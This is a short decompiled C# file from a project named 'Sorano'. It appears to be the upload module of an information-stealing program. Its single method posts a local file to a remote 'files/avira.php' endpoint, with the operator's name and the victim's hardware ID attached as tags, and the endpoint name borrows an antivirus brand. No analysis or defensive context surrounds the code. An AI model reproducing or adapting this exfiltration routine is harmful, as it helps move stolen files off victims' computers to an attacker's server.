using System;
using System.Net;

namespace Sorano
{
	// Token: 0x02000004 RID: 4
	internal static class Network
	{
		// Token: 0x06000006 RID: 6 RVA: 0x0000300C File Offset: 0x0000120C
		public static void UploadFile(string path)
		{
			try
			{
				new WebClient().UploadFile(RawSettings.SiteUrl + string.Format("files/avira.php?user={0}&hwid={1}", RawSettings.Owner, RawSettings.HWID), "POST", path);
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.ToString());
			}
		}
	}
}
